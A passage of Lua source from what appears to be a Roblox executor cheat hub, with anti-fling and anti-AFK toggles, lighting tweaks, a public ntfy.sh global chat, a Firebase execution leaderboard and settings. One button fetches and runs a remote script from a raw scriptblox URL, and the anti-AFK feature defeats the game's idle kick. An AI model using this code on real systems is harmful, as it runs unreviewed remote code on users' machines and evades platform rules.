				end
				task.wait(2)
			end
		end)
	end

	--==============================================================================================
	-- 6) ANTI TOOL SPAM: hides (client-side) tool spam from other players that causes lag
	--==============================================================================================
	local MAX_TOOLS = 4

	local function setAntiToolSpam(state)
		clearFeature("antiToolSpam")
		if not state then
			return
		end
		local list = bag("antiToolSpam")
		local running = true
		table.insert(list, function()
			running = false
		end)

		task.spawn(function()
			while running do
				for _, plr in ipairs(PlayersSvc:GetPlayers()) do
					if plr ~= LocalPlayer then
						local tools = {}
						for _, holder in ipairs({ plr.Character, plr:FindFirstChildOfClass("Backpack") }) do
							if holder then
								for _, child in ipairs(holder:GetChildren()) do
									if child:IsA("Tool") then
										table.insert(tools, child)
									end
								end
							end
						end
						for index = MAX_TOOLS + 1, #tools do
							pcall(tools[index].Destroy, tools[index])
						end
					end
				end
				task.wait(2)
			end
		end)
	end

	--==============================================================================================
	-- UI
	--==============================================================================================
	Protection:CreateParagraph({
		Text = "Switch protections on or off with the toggle on the right. Settings are saved.",
	})

	Protection:CreateSection({ Text = "Master" })
	Protection:CreateToggle({
		Name = "All Protection",
		Description = "Turns every protection below on or off at once",
		Callback = function(state)
			for _, toggle in ipairs(allToggles) do
				toggle:SetValue(state)
			end
			Loader:Notify({
				Title = "Protection",
				Content = state and "All protections enabled" or "All protections disabled",
				Type = state and "Success" or "Info",
				Duration = 2.5,
			})
		end,
	})

	Protection:CreateSection({ Text = "Movement" })
	addToggle({
		Name = "Anti Fling",
		Description = "Cancels fling velocity, others can't collide with you",
		Flag = "prot_antiFling",
		Callback = setAntiFling,
	})
	addToggle({
		Name = "Anti Void",
		Description = "Teleports you back to safe ground if you fall into the void",
		Flag = "prot_antiVoid",
		Callback = setAntiVoid,
	})
	addToggle({
		Name = "Anti Sit / Grab / Couch",
		Description = "Stops you from being forced to sit (also blocks driving)",
		Flag = "prot_antiSit",
		Callback = setAntiSit,
	})

	Protection:CreateSection({ Text = "Objects" })
	addToggle({
		Name = "Anti Vehicle Fling",
		Description = "Other players' vehicles can't hit you, yours stays normal",
		Flag = "prot_antiVehicle",
		Callback = setAntiVehicle,
	})
	addToggle({
		Name = "Anti Tool Spam",
		Description = "Hides tool spam from others to reduce lag",
		Flag = "prot_antiToolSpam",
		Callback = setAntiToolSpam,
	})
end

--==================================================================================================
-- SHARED HELPERS
--==================================================================================================
local function copyToClipboard(text, label)
	local copy = setclipboard or toclipboard
	if copy then
		local ok = pcall(copy, text)
		if ok then
			Loader:Notify({ Title = "Copied", Content = (label or "Text") .. " copied to clipboard!", Type = "Success", Duration = 2.5 })
			return
		end
	end
	-- No clipboard support: show the text so it can be copied by hand
	Loader:Notify({ Title = label or "Copy", Content = tostring(text), Type = "Info", Duration = 8, Force = true })
end

--==================================================================================================
-- UTILITY TAB
--==================================================================================================
local Utility = Loader:CreateTab("Utility")

Utility:CreateSection({ Text = "Quality of Life" })

-- Anti-AFK: answers the idle check so you are not kicked after ~20 minutes of no input
local antiAfkConnection = nil

Utility:CreateToggle({
	Name = "Anti-AFK",
	Description = "Stops the idle kick while you are away",
	Flag = "antiAfk",
	Default = false,
	Callback = function(state)
		if antiAfkConnection then
			antiAfkConnection:Disconnect()
			antiAfkConnection = nil
		end
		if state then
			local VirtualUser = game:GetService("VirtualUser")
			antiAfkConnection = LocalPlayer.Idled:Connect(function()
				VirtualUser:CaptureController()
				VirtualUser:ClickButton2(Vector2.new())
			end)
		end
		Loader:Log("Anti-AFK " .. (state and "enabled" or "disabled"), "Info")
		Loader:Notify({ Title = "Anti-AFK", Content = state and "Enabled" or "Disabled", Type = state and "Success" or "Info", Duration = 2.5 })
	end,
})

Loader:AddCleanup(function()
	if antiAfkConnection then
		antiAfkConnection:Disconnect()
	end
end)

-- FPS Boost: lower render quality, no shadows, post effects off. Fully reversible.
local fpsBackup = nil

local function applyFpsBoost(state)
	local Lighting = game:GetService("Lighting")
	if state then
		if fpsBackup then
			return
		end
		fpsBackup = { Shadows = Lighting.GlobalShadows, Quality = nil, Effects = {} }
		pcall(function()
			fpsBackup.Quality = settings().Rendering.QualityLevel
			settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
		end)
		Lighting.GlobalShadows = false
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("PostEffect") then
				table.insert(fpsBackup.Effects, { Instance = effect, Enabled = effect.Enabled })
				effect.Enabled = false
			end
		end
	else
		if not fpsBackup then
			return
		end
		local backup = fpsBackup
		fpsBackup = nil
		Lighting.GlobalShadows = backup.Shadows
		if backup.Quality then
			pcall(function()
				settings().Rendering.QualityLevel = backup.Quality
			end)
		end
		for _, entry in ipairs(backup.Effects) do
			if entry.Instance.Parent then
				entry.Instance.Enabled = entry.Enabled
			end
		end
	end
end

Utility:CreateToggle({
	Name = "FPS Boost",
	Description = "Low quality, no shadows, no post effects (reversible)",
	Flag = "fpsBoost",
	Default = false,
	Callback = function(state)
		applyFpsBoost(state)
		Loader:Log("FPS Boost " .. (state and "enabled" or "disabled"), "Info")
		Loader:Notify({ Title = "FPS Boost", Content = state and "Enabled" or "Disabled (settings restored)", Type = state and "Success" or "Info", Duration = 2.5 })
	end,
})

Loader:AddCleanup(function()
	applyFpsBoost(false)
end)

Utility:CreateSection({ Text = "Visuals" })

-- Fullbright: removes darkness and fog. Fully reversible (original lighting is restored).
local fullbrightBackup = nil
local fullbrightLoopId = 0

local function applyFullbright(state)
	local Lighting = game:GetService("Lighting")
	fullbrightLoopId += 1 -- stops any older loop
	if state then
		if not fullbrightBackup then
			fullbrightBackup = {
				Brightness = Lighting.Brightness,
				ClockTime = Lighting.ClockTime,
				FogEnd = Lighting.FogEnd,
				GlobalShadows = Lighting.GlobalShadows,
				Ambient = Lighting.Ambient,
				OutdoorAmbient = Lighting.OutdoorAmbient,
			}
		end
		local myId = fullbrightLoopId
		task.spawn(function()
			-- games often reset lighting, so it is re-applied twice a second
			while fullbrightLoopId == myId and not Loader._destroyed do
				Lighting.Brightness = 2
				Lighting.ClockTime = 14
				Lighting.FogEnd = 1e6
				Lighting.GlobalShadows = false
				Lighting.Ambient = Color3.fromRGB(178, 178, 178)
				Lighting.OutdoorAmbient = Color3.fromRGB(178, 178, 178)
				task.wait(0.5)
			end
		end)
	else
		local backup = fullbrightBackup
		fullbrightBackup = nil
		if backup then
			for property, value in pairs(backup) do
				pcall(function()
					Lighting[property] = value
				end)
			end
		end
	end
end

Utility:CreateToggle({
	Name = "Fullbright",
	Description = "Removes darkness and fog (reversible)",
	Flag = "fullbright",
	Default = false,
	Callback = function(state)
		applyFullbright(state)
		Loader:Log("Fullbright " .. (state and "enabled" or "disabled"), "Info")
		Loader:Notify({ Title = "Fullbright", Content = state and "Enabled" or "Disabled (lighting restored)", Type = state and "Success" or "Info", Duration = 2.5 })
	end,
})

Loader:AddCleanup(function()
	applyFullbright(false)
end)

Utility:CreateScript({
	Name = "VÆLOR SHADERS",
	Description = "Roshade: realistic shaders for any game",
	Callback = function()
		RunUrl("https://scriptblox.com/raw/Universal-Script-Roshade-232647")
	end,
})

Utility:CreateSection({ Text = "Copy" })

Utility:CreateButton({
	Name = "Game ID",
	Description = "Place ID: " .. tostring(game.PlaceId),
	ButtonText = "Copy",
	Callback = function()
		copyToClipboard(tostring(game.PlaceId), "Game ID")
	end,
})

Utility:CreateButton({
	Name = "Job ID",
	Description = "ID of the server you are in right now",
	ButtonText = "Copy",
	Callback = function()
		if game.JobId == "" then
			error("No Job ID available here.")
		end
		copyToClipboard(game.JobId, "Job ID")
	end,
})

Utility:CreateButton({
	Name = "Username",
	Description = "Your username: " .. LocalPlayer.Name,
	ButtonText = "Copy",
	Callback = function()
		copyToClipboard(LocalPlayer.Name, "Username")
	end,
})

Utility:CreateButton({
	Name = "Join Link",
	Description = "Link that opens this exact server",
	ButtonText = "Copy",
	Callback = function()
		copyToClipboard(
			("roblox://experiences/start?placeId=%s&gameInstanceId=%s"):format(tostring(game.PlaceId), game.JobId),
			"Join link"
		)
	end,
})

Utility:CreateSection({ Text = "Session" })

local ServerAgeStat = Utility:CreateStat({ Name = "Server Age", Value = "-" })
local SessionStat = Utility:CreateStat({ Name = "Time In Game", Value = "-" })
Utility:CreateStat({ Name = "Place Version", Value = tostring(game.PlaceVersion) })

local function formatTime(seconds)
	seconds = math.max(math.floor(seconds), 0)
	return string.format("%d:%02d:%02d", seconds // 3600, (seconds % 3600) // 60, seconds % 60)
end

task.spawn(function()
	while not Loader._destroyed do
		if ServerAgeStat then
			ServerAgeStat:SetValue(formatTime(workspace.DistributedGameTime))
		end
		if SessionStat then
			SessionStat:SetValue(formatTime(time()))
		end
		task.wait(1)
	end
end)

--==================================================================================================
-- GLOBAL CHAT TAB (all VÆLOR HUB users, any server/game)
-- PASTE after the LEADERBOARD block and BEFORE "SETTINGS TAB".
-- Uses a public ntfy.sh topic, so no server of your own is needed.
--==================================================================================================
do
	local CHAT_URL = "https://ntfy.sh/vaelor-hub-global-chat-v1" -- change the name to make it yours
	local CHAT_POLL = 4 -- seconds between checks
	local CHAT_COOLDOWN = 2 -- seconds between your own messages
	local CHAT_MAX_LEN = 150
	local CHAT_MAX_LINES = 100

	local chatActive = true
	local seen = {}
	local lastSent = 0
	local sinceTime = os.time() - 1800 -- on first load, show the last 30 minutes
	local lineCounter = 0

	-- Custom component: scrolling chat log --------------------------------------------------------
	Library:RegisterComponent("ChatLog", function(tab, config)
		local theme = tab.Window.Theme
		local row = tab:_CreateRow(config.Height or 230)
		tab:_Index(row, "", true)

		local list = create("ScrollingFrame", {
			Position = UDim2.fromOffset(8, 8),
			Size = UDim2.new(1, -16, 1, -16),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			ScrollBarThickness = 3,
			ScrollBarImageColor3 = theme.Accent,
			CanvasSize = UDim2.new(),
			AutomaticCanvasSize = Enum.AutomaticSize.Y,
			Parent = row,
		})
		create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 4), Parent = list })

		local component = { Instance = row }

		local function esc(s)
			return (tostring(s):gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;"))
		end

		-- LONG PRESS (hold ~0.45s) on any chat text -> small COPY button appears ----------------------
		local copyPopup
		local function closeCopy()
			if copyPopup then
				copyPopup:Destroy()
				copyPopup = nil
			end
		end

		local function showCopy(obj, text)
			closeCopy()
			if not obj.Parent then
				return
			end
			local btn = create("TextButton", {
				AnchorPoint = Vector2.new(1, 0.5),
				Position = UDim2.new(1, -4, 0.5, 0),
				Size = UDim2.fromOffset(58, 22),
				BackgroundColor3 = theme.Accent,
				AutoButtonColor = true,
				Text = "COPY",
				TextColor3 = theme.Text,
				Font = Enum.Font.GothamBold,
				TextSize = 11,
				BorderSizePixel = 0,
				ZIndex = 20,
				Parent = obj,
			})
			addCorner(btn, 6)
			copyPopup = btn
			btn.Activated:Connect(function()
				local copy = setclipboard or toclipboard
				local ok = copy and pcall(copy, tostring(text))
				closeCopy()
				tab.Window:Notify({
					Title = "Copy",
					Content = ok and "Message copied!" or tostring(text),
					Type = ok and "Success" or "Info",
					Duration = ok and 2 or 6,
					Force = true,
				})
			end)
			task.delay(4, function()
				if copyPopup == btn then
					closeCopy()
				end
			end)
		end

		local function attachCopy(obj, text)
			obj.InputBegan:Connect(function(input)
				local t = input.UserInputType
				if t ~= Enum.UserInputType.Touch and t ~= Enum.UserInputType.MouseButton1 then
					return
				end
				local startPos = input.Position
				task.delay(0.45, function()
					if not obj.Parent or input.UserInputState == Enum.UserInputState.End then
						return
					end
					if (input.Position - startPos).Magnitude > 12 then
						return -- finger moved = the person is scrolling, not long-pressing
					end
					showCopy(obj, text)
				end)
			end)
		end

		function component:AddMessage(rank, display, username, text, isSelf)
			lineCounter += 1
			local rankColor = Library.GetCardColor(username) or theme.AccentLight
			local nameColor = isSelf and theme.Success or theme.Text
			local prefix = rank ~= "" and ('<font color="#%s">[%s]</font> '):format(rankColor:ToHex(), rank) or ""
			local msgLabel = create("TextLabel", {
				LayoutOrder = lineCounter,
				Size = UDim2.new(1, -6, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
				BackgroundTransparency = 1,
				RichText = true,
				Text = ('%s<font color="#%s"><b>%s</b></font> <font color="#%s">@%s</font>: %s'):format(
					prefix,
					nameColor:ToHex(),
					esc(display),
					theme.SubText:ToHex(),
					esc(username),
					esc(text)
				),
				TextColor3 = theme.Text,
				Font = Enum.Font.Gotham,
				TextSize = 12,
				TextWrapped = true,
				TextXAlignment = Enum.TextXAlignment.Left,
				TextYAlignment = Enum.TextYAlignment.Top,
				Parent = list,
			})
			attachCopy(msgLabel, text)

			-- keep memory low: remove the oldest lines
			local lines = {}
			for _, child in ipairs(list:GetChildren()) do
				if child:IsA("TextLabel") then
					table.insert(lines, child)
				end
			end
			table.sort(lines, function(a, b)
				return a.LayoutOrder < b.LayoutOrder
			end)
			for i = 1, #lines - CHAT_MAX_LINES do
				lines[i]:Destroy()
			end

			task.defer(function()
				if list.Parent then
					list.CanvasPosition = Vector2.new(0, list.AbsoluteCanvasSize.Y)
				end
			end)
		end

		-- Messages written by the hub itself. They always show the sender name "SERVER".
		function component:AddSystem(text, kind)
			lineCounter += 1
			local gold = Color3.fromRGB(255, 200, 40)
			local textColor = kind == "promo" and theme.AccentLight or theme.Text
			local sysLabel = create("TextLabel", {
				LayoutOrder = lineCounter,
				Size = UDim2.new(1, -6, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
				BackgroundTransparency = 1,
				RichText = true,
				Text = ('<font color="#%s"><b>[SERVER]</b></font> <font color="#%s"><b>SERVER</b></font>: <font color="#%s">%s</font>'):format(
					gold:ToHex(),
					gold:ToHex(),
					textColor:ToHex(),
					esc(text)
				),
				TextColor3 = theme.Text,
				Font = Enum.Font.Gotham,
				TextSize = 12,
				TextWrapped = true,
				TextXAlignment = Enum.TextXAlignment.Left,
				TextYAlignment = Enum.TextYAlignment.Top,
				Parent = list,
			})
			attachCopy(sysLabel, text)
			task.defer(function()
				if list.Parent then
					list.CanvasPosition = Vector2.new(0, list.AbsoluteCanvasSize.Y)
				end
			end)
		end

		function component:Clear()
			for _, child in ipairs(list:GetChildren()) do
				if not child:IsA("UIListLayout") then
					child:Destroy()
				end
			end
		end

		-- Giveaway announcement inside the chat, with a Join button and a live countdown
		function component:AddGiveaway(host, rank, endsAt, onJoin, alreadyJoined)
			lineCounter += 1
			local gold = Color3.fromRGB(255, 200, 40)
			local box = create("Frame", {
				LayoutOrder = lineCounter,
				Size = UDim2.new(1, -6, 0, 0),
				AutomaticSize = Enum.AutomaticSize.Y,
				BackgroundColor3 = theme.SurfaceLight,
				BorderSizePixel = 0,
				Parent = list,
			})
			addCorner(box, 8)
			addStroke(box, gold, 1.5, 0)
			addPadding(box, 8, 8, 8, 8)
			create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 4), Parent = box })

			local function line(order, text, size, color, font)
				return create("TextLabel", {
					LayoutOrder = order,
					Size = UDim2.new(1, 0, 0, 0),
					AutomaticSize = Enum.AutomaticSize.Y,
					BackgroundTransparency = 1,
					Text = text,
					TextColor3 = color,
					Font = font,
					TextSize = size,
					TextWrapped = true,
					TextXAlignment = Enum.TextXAlignment.Left,
					Parent = box,
				})
			end
			line(1, "🎁 GIVEAWAY HAPPENING!", 13, gold, Enum.Font.GothamBold)
			line(2, "Hosted by [ " .. tostring(rank) .. " ] " .. tostring(host) .. "  •  Prize: 👑 VIP Title", 11, theme.Text, Enum.Font.Gotham)
			local countdown = line(3, "", 11, theme.AccentLight, Enum.Font.GothamMedium)

			local joinBtn
			if onJoin then
				joinBtn = create("TextButton", {
					LayoutOrder = 4,
					Size = UDim2.new(1, 0, 0, 30),
					BackgroundColor3 = theme.Accent,
					AutoButtonColor = false,
					Text = alreadyJoined and "✅ PARTICIPATED" or "PARTICIPATE",
					TextColor3 = theme.Text,
					Font = Enum.Font.GothamBold,
					TextSize = 12,
					BorderSizePixel = 0,
					Parent = box,
				})
				addCorner(joinBtn, 8)
				tab.Window:_AddButtonFx(joinBtn, theme.Accent, theme.AccentLight)
				joinBtn.Activated:Connect(onJoin)
			end

			local entry = { Joined = alreadyJoined == true }
			function entry.SetState(status)
				if not joinBtn or not joinBtn.Parent then
					return
				end
				if status == "joining" then
					joinBtn.Text = "Participating..."
				elseif status == "joined" then
					entry.Joined = true
					joinBtn.Text = "✅ PARTICIPATED! VIP unlocked"
				elseif not entry.Joined then
					joinBtn.Text = "PARTICIPATE"
				end
			end

			task.spawn(function()
				while box.Parent and os.clock() < endsAt do
					local left = math.ceil(endsAt - os.clock())
					countdown.Text = ("Ends in %d:%02d"):format(left // 60, left % 60)
					task.wait(0.5)
				end
				if box.Parent then
					countdown.Text = "Giveaway ended"
					if joinBtn and not entry.Joined then
						joinBtn.Text = "Ended"
						joinBtn.BackgroundColor3 = theme.SurfaceLight
					end
				end
			end)

			task.defer(function()
				if list.Parent then
					list.CanvasPosition = Vector2.new(0, list.AbsoluteCanvasSize.Y)
				end
			end)
			return entry
		end

		return component
	end)

	-- Tab ---------------------------------------------------------------------------------------
	local chatTab = Loader:CreateTab("Global Chat")
	chatTab:CreateSection({ Text = "Global Chat" })
	local chatStat = chatTab:CreateStat({ Name = "Status", Value = "Connecting..." })
	local log = chatTab:CreateChatLog({ Height = 200 })
	Library.ChatLog = log -- lets the admin/giveaway system post into the chat
	local input

	local function clean(text)
		text = tostring(text or "")
		text = text:gsub("[%c]", " ")
		text = text:gsub("^%s+", ""):gsub("%s+$", "")
		return string.sub(text, 1, CHAT_MAX_LEN)
	end

	-- SERVER messages. The TEXT is built on every client from a fixed template (only the username
	-- comes from the message), so nobody can send fake text through these.
	local PROMO_TEXT = "JOIN VÆLOR DISCORD SERVER TO GET VIP TITLE"
	local PROMO_EVERY = 300 -- 5 minutes
	local SYS_TEXT = {
		join = function(name)
			local rank = Library.GetCardTitle(name)
			if rank == "OWNER" or rank == "ADMIN" then
				return rank .. " " .. name .. " JOINED THE SERVER‼️"
			end
			return name .. " JOINED VÆLOR CHAT"
		end,
		gw = function(name)
			return name .. " PARTICIPATED IN GIVEAWAY"
		end,
	}

	-- Library.PostSystem("join" | "gw"): shows the line for you and sends it to everyone's chat
	function Library.PostSystem(kind)
		local build = SYS_TEXT[kind]
		if not build or not httpRequest then
			return
		end
		local text = build(LocalPlayer.Name)
		local nonce = LocalPlayer.UserId .. "-" .. math.random(100000, 999999) .. "-" .. os.time()
		seen[nonce] = true
		log:AddSystem(text)
		task.spawn(function()
			pcall(httpRequest, {
				Url = CHAT_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "text/plain" },
				Body = InfoHttp:JSONEncode({
					n = nonce,
					uid = LocalPlayer.UserId,
					name = LocalPlayer.Name,
					display = LocalPlayer.DisplayName,
					sys = kind,
					msg = text, -- older hub versions just show this as a normal line
				}),
			})
		end)
	end

	local function sendMessage(raw)
		local text = clean(raw)
		if text == "" then
			return
		end
		-- OWNER / ADMIN: a message that starts with / runs as an admin command (not sent to the chat)
		if string.sub(text, 1, 1) == "/" and Library.StaffCommandRunner then
			if input then
				input:SetText("")
			end
			task.spawn(function()
				local ok, err = pcall(Library.StaffCommandRunner, text)
				if not ok then
					Loader:Notify({
						Title = "Admin",
						Content = (tostring(err):gsub("^.-:%d+:%s*", "")),
						Type = "Error",
						Duration = 4,
						Force = true,
					})
				end
			end)
			return
		end
		if not httpRequest then
			error("Your executor has no HTTP support.")
		end
		if Library.MutedSet[string.lower(LocalPlayer.Name)] then
			error("You are muted by an admin.")
		end
		local rankNow = Library.GetCardTitle(LocalPlayer.Name)
		local isStaffNow = rankNow == "OWNER" or rankNow == "ADMIN"
		local cooldown = isStaffNow and 0.5 or (Library.ChatCooldown or CHAT_COOLDOWN)
		if os.clock() - lastSent < cooldown then
			error("Slow mode: wait " .. tostring(cooldown) .. "s between messages.")
		end
		lastSent = os.clock()

		local nonce = LocalPlayer.UserId .. "-" .. math.random(100000, 999999) .. "-" .. os.time()
		seen[nonce] = true
		local rank = Library.GetCardTitle(LocalPlayer.Name)
		log:AddMessage(rank == "VÆLOR USER" and "" or rank, LocalPlayer.DisplayName, LocalPlayer.Name, text, true)
		if input then
			input:SetText("")
		end

		task.spawn(function()
			pcall(httpRequest, {
				Url = CHAT_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "text/plain" },
				Body = InfoHttp:JSONEncode({
					n = nonce,
					uid = LocalPlayer.UserId,
					name = LocalPlayer.Name,
					display = LocalPlayer.DisplayName,
					msg = text,
				}),
			})
		end)
	end

	input = chatTab:CreateTextbox({
		Name = "Message",
		Placeholder = "Type a message...",
		Callback = function(text, enterPressed)
			if enterPressed then
				sendMessage(text)
			end
		end,
	})

	chatTab:CreateButton({
		Name = "Send",
		ButtonText = "Send",
		Callback = function()
			sendMessage(input:GetText())
		end,
	})

	-- Polling -----------------------------------------------------------------------------------
	local function pollChat()
		local ok, res = pcall(httpRequest, {
			Url = CHAT_URL .. "/json?poll=1&since=" .. tostring(sinceTime),
			Method = "GET",
		})
		if not ok or type(res) ~= "table" or type(res.Body) ~= "string" then
			chatStat:SetValue("Offline (request failed)", InfoTheme.Warning)
			return
		end

		local count = 0
		for line in string.gmatch(res.Body, "[^\r\n]+") do
			local okLine, event = pcall(InfoHttp.JSONDecode, InfoHttp, line)
			if okLine and type(event) == "table" and event.event == "message" and type(event.message) == "string" then
				local t = tonumber(event.time) or 0
				if t > sinceTime then
					sinceTime = t
				end
				local okMsg, data = pcall(InfoHttp.JSONDecode, InfoHttp, event.message)
				if okMsg and type(data) == "table" and type(data.msg) == "string" then
					local id = tostring(data.n or event.id)
					if not seen[id] then
						seen[id] = true
						local uname = string.sub(tostring(data.name or "?"), 1, 30)
						local rank = Library.GetCardTitle(uname)
						if data.sys == "join" and rank ~= "OWNER" and rank ~= "ADMIN" then
							-- normal user join notifications are hidden; only OWNER / ADMIN are shown
						elseif not Library.MutedSet[string.lower(uname)] then
							local sysBuild = type(data.sys) == "string" and SYS_TEXT[data.sys]
							if sysBuild then
								log:AddSystem(sysBuild(uname))
							else
								log:AddMessage(
									rank == "VÆLOR USER" and "" or rank,
									string.sub(tostring(data.display or uname), 1, 40),
									uname,
									clean(data.msg),
									false
								)
							end
							count += 1
							if count % 5 == 0 then
								task.wait()
							end
						end
					end
				end
			end
		end
		chatStat:SetValue("Online", InfoTheme.Success)
	end

	task.spawn(function()
		if not httpRequest then
			chatStat:SetValue("Offline (executor has no HTTP)", InfoTheme.Warning)
			return
		end
		while chatActive and not Loader._destroyed do
			pcall(pollChat)
			task.wait(CHAT_POLL)
		end
	end)

	-- "OWNER / ADMIN JOINED THE SERVER‼️" once after execute (normal users send nothing)
	task.spawn(function()
		if not httpRequest then
			return
		end
		local myRank = Library.GetCardTitle(LocalPlayer.Name)
		if myRank ~= "OWNER" and myRank ~= "ADMIN" then
			return
		end
		task.wait(2)
		if chatActive and not Loader._destroyed then
			Library.PostSystem("join")
		end
	end)

	-- Every 5 minutes: "JOIN VÆLOR DISCORD SERVER TO GET VIP TITLE" from SERVER
	task.spawn(function()
		task.wait(5)
		while chatActive and not Loader._destroyed do
			log:AddSystem(PROMO_TEXT, "promo")
			for _ = 1, PROMO_EVERY do
				if not chatActive or Loader._destroyed then
					return
				end
				task.wait(1)
			end
		end
	end)

	Loader:AddCleanup(function()
		chatActive = false
	end)
end

--==================================================================================================
-- LEADERBOARD TAB: most executions, same list for everyone (any server), refreshes every 5 minutes
-- Needs a free Firebase Realtime Database (see the steps in the chat). No server code to host.
--==================================================================================================
do
	local FIREBASE_URL = "https://vaelor-firebase-default-rtdb.asia-southeast1.firebasedatabase.app"
	local LB_REFRESH = 300 -- seconds (5 minutes)
	local LB_TOP = 50

	local lbTab = Loader:CreateTab("Leaderboard")
	lbTab:CreateSection({ Text = "Most Executions" })
	local lbStat = lbTab:CreateStat({ Name = "Status", Value = "Loading..." })
	local lbCards = {}
	local lbActive = true
	local baseUrl = string.gsub(FIREBASE_URL, "/+$", "")

	local function lbSubmit()
		pcall(httpRequest, {
			Url = baseUrl .. "/leaderboard/" .. LocalPlayer.UserId .. ".json",
			Method = "PATCH",
			Headers = { ["Content-Type"] = "application/json" },
			Body = InfoHttp:JSONEncode({
				name = LocalPlayer.Name,
				display = LocalPlayer.DisplayName,
				count = { [".sv"] = { increment = 1 } }, -- +1 execution, counted by the database
			}),
		})
	end

	local function lbFetch()
		local ok, res = pcall(httpRequest, {
			Url = baseUrl .. '/leaderboard.json?orderBy=%22count%22&limitToLast=' .. LB_TOP,
			Method = "GET",
		})
		if not ok or type(res) ~= "table" or type(res.Body) ~= "string" then
			lbStat:SetValue("Offline (request failed)", InfoTheme.Warning)
			return
		end
		local okJson, data = pcall(InfoHttp.JSONDecode, InfoHttp, res.Body)
		if not okJson or type(data) ~= "table" then
			lbStat:SetValue("Offline (bad response)", InfoTheme.Warning)
			return
		end

		local list = {}
		for uid, entry in pairs(data) do
			local id, count = tonumber(uid), type(entry) == "table" and tonumber(entry.count)
			if id and count then
				table.insert(list, {
					uid = id,
					count = count,
					name = string.sub(tostring(entry.name or "?"), 1, 30),
					display = string.sub(tostring(entry.display or entry.name or "?"), 1, 40),
				})
			end
		end
		table.sort(list, function(a, b)
			return a.count > b.count
		end)

		for _, card in ipairs(lbCards) do
			card.Remove()
		end
		table.clear(lbCards)
		local RANK_COLORS = {
			[1] = Color3.fromRGB(255, 200, 40), -- Gold
			[2] = Color3.fromRGB(200, 205, 215), -- Silver
			[3] = Color3.fromRGB(190, 115, 50), -- Brown / Bronze
		}
		for rank, entry in ipairs(list) do
			if rank > LB_TOP or Loader._destroyed then
				break
			end
			local card = lbTab:CreateUserCard({
				Title = string.format("#%d  •  %d EXECUTIONS", rank, entry.count),
				Color = RANK_COLORS[rank],
				DisplayName = entry.display,
				Username = entry.name,
				Image = "rbxthumb://type=AvatarHeadShot&id=" .. entry.uid .. "&w=150&h=150",
			})
			if card then
				table.insert(lbCards, card)
			end
			if rank % 5 == 0 then
				task.wait() -- spread over frames (no lag spike)
			end
		end
		lbStat:SetValue("Updated • refreshes every 5 min", InfoTheme.Success)
	end

	task.spawn(function()
		if baseUrl == "" then
			lbStat:SetValue("Not set up (add FIREBASE_URL)", InfoTheme.Warning)
			return
		end
		if not httpRequest then
			lbStat:SetValue("Offline (executor has no HTTP)", InfoTheme.Warning)
			return
		end
		lbSubmit()
		while lbActive and not Loader._destroyed do
			pcall(lbFetch)
			for _ = 1, LB_REFRESH do
				if not lbActive or Loader._destroyed then
					return
				end
				task.wait(1)
			end
		end
	end)

	Loader:AddCleanup(function()
		lbActive = false
	end)
end

--==================================================================================================
-- SETTINGS TAB
--==================================================================================================
local Settings = Loader:CreateTab("Settings")

Settings:CreateSection({ Text = "Interface" })

Settings:CreateSlider({
	Name = "UI Scale",
	Min = 0.7,
	Max = 1.2,
	Step = 0.05,
	Default = 1,
	Decimals = 2,
	Suffix = "x",
	Flag = "uiScale",
	OnRelease = true, -- applied when you let go, so the slider does not move under your finger
	Callback = function(value)
		Loader:SetUIScale(value)
	end,
})

Settings:CreateKeybind({
	Name = "Toggle Key",
	Description = "Show / hide the hub (keyboard)",
	Flag = "toggleKey",
	Default = "RightShift",
	Callback = function(key)
		Loader:Notify({ Title = "Toggle Key", Content = "Set to " .. key, Type = "Success", Duration = 2.5 })
	end,
})

Settings:CreateDropdown({
	Name = "Theme",
	Options = { "Purple", "Red", "Blue", "Green" },
	Default = "Purple",
	Flag = "themeV2",
	Callback = function(value)
		Loader:Notify({ Title = "Theme", Content = value .. " saved. Re-execute the script to apply it.", Type = "Info", Duration = 4, Force = true })
	end,
})

Settings:CreateSection({ Text = "Behavior" })

Settings:CreateToggle({
	Name = "Notifications",
	Description = "Info & success pop-ups (errors always show)",
	Flag = "notifications",
	Default = true,
})

Settings:CreateToggle({
	Name = "Auto-minimize after run",
	Description = "Minimizes the hub after a script runs",
	Flag = "autoMinimize",
	Default = true,
})

Settings:CreateToggle({
	Name = "Copy Discord on load",
	Description = "Copies the invite link when the hub loads",
	Flag = "copyDiscord",
	Default = true,
})

Settings:CreateToggle({
	Name = "Remember last tab",
	Description = "Opens the tab you used last instead of Info",
	Flag = "rememberTab",
	Default = false,
})

Settings:CreateSection({ Text = "Hub" })

Settings:CreateStat({ Name = "Version", Value = HUB_VERSION })

local function checkForUpdates(manual)
	if VERSION_URL == "" then
		if manual then
			error("No version link set yet. Put a raw text link in VERSION_URL.")
		end
		return
	end
	local ok, body = pcall(function()
		return game:HttpGet(VERSION_URL)
	end)
	if not ok then
		if manual then
			error("Could not reach the version file.")
		end
		return
	end
	local latest = string.match(tostring(body), "^%s*(.-)%s*$")
	if latest == "" then
		return
	end
	if latest ~= HUB_VERSION then
		Loader:Log("Update available: " .. latest, "Warning")
		Loader:Notify({ Title = "Update available", Content = "Latest: " .. latest .. " (you have " .. HUB_VERSION .. ")", Type = "Warning", Duration = 8 })
	elseif manual then
		Loader:Notify({ Title = "Updates", Content = "You are on the latest version.", Type = "Success", Duration = 3, Force = true })
	end
end

Settings:CreateButton({
	Name = "Check for Updates",
	Description = "Compares your version with the latest one",
	ButtonText = "Check",
	Callback = function()
		checkForUpdates(true)
	end,
})

Settings:CreateButton({
	Name = "Reset Settings",
	Description = "Clears ALL settings, favorites and saved spots",
	ButtonText = "Reset",
	Callback = function()
		Config:Reset()
		Loader:Log("Settings reset", "Warning")
		Loader:Notify({ Title = "Settings", Content = "Everything was reset. Re-execute the script to apply.", Type = "Warning", Duration = 5 })
	end,
})

--==================================================================================================
-- ADMIN COMMANDS: announcement, call users, VIP title, giveaway, command line
